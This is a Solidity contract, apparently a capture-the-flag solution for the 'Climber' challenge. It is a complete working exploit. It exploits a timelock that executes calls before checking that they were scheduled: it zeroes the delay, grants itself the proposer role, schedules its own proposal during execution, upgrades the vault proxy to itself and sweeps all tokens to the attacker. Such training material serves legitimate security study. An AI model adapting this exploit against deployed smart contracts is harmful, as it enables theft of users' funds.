// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract ClimberExploit is UUPSUpgradeable {
  ClimberTimelock immutable timelock;
  address immutable vaultProxyAddress;
  IERC20 immutable token;
  address immutable attacker;

  constructor(
    ClimberTimelock _timelock,
    address _vaultProxyAddress,
    IERC20 _token
  ) {
    timelock = _timelock;
    vaultProxyAddress = _vaultProxyAddress;
    token = _token;
    attacker = msg.sender;
  }

  function buildProposal()
    internal
    returns (
      address[] memory,
      uint256[] memory,
      bytes[] memory
    )
  {
    address[] memory targets = new address[](5);
    uint256[] memory values = new uint256[](5);
    bytes[] memory dataElements = new bytes[](5);

    // Update delay to 0.
    targets[0] = address(timelock);
    values[0] = 0;
    dataElements[0] = abi.encodeWithSelector(
      ClimberTimelock.updateDelay.selector,
      0
    );

    // Grant this contract the proposer role.
    targets[1] = address(timelock);
    values[1] = 0;
    dataElements[1] = abi.encodeWithSelector(
      AccessControl.grantRole.selector,
      timelock.PROPOSER_ROLE(),
      address(this)
    );

    // Call this contract to schedule the proposal.
    targets[2] = address(this);
    values[2] = 0;
    dataElements[2] = abi.encodeWithSelector(
      ClimberExploit.scheduleProposal.selector
    );

    // Upgrade the Proxy to use this contract as implementation instead.
    targets[3] = address(vaultProxyAddress);
    values[3] = 0;
    dataElements[3] = abi.encodeWithSelector(
      UUPSUpgradeable.upgradeTo.selector,
      address(this)
    );

    // Now sweep the funds!
    targets[4] = address(vaultProxyAddress);
    values[4] = 0;
    dataElements[4] = abi.encodeWithSelector(
      ClimberExploit.sweepFunds.selector
    );

    return (targets, values, dataElements);
  }

  // Start exploit by executing a proposal that makes us a proposer.
  function executeProposal() external {
    (
      address[] memory targets,
      uint256[] memory values,
      bytes[] memory dataElements
    ) = buildProposal();
    timelock.execute(targets, values, dataElements, 0);
  }

  // Timelock calls this while proposal is still being executed but we
  // are a proposer now and can schedule it to make it legit.
  function scheduleProposal() external {
    (
      address[] memory targets,
      uint256[] memory values,
      bytes[] memory dataElements
    ) = buildProposal();
    timelock.schedule(targets, values, dataElements, 0);
  }

  // Once this contract became the Vault Proxy's new Logic Contract
  // this function will be called to move all tokens to the attacker.
  function sweepFunds() external {
    token.transfer(attacker, token.balanceOf(address(this)));
  }

  function _authorizeUpgrade(address newImplementation)
    internal
    virtual
    override
  {}
}
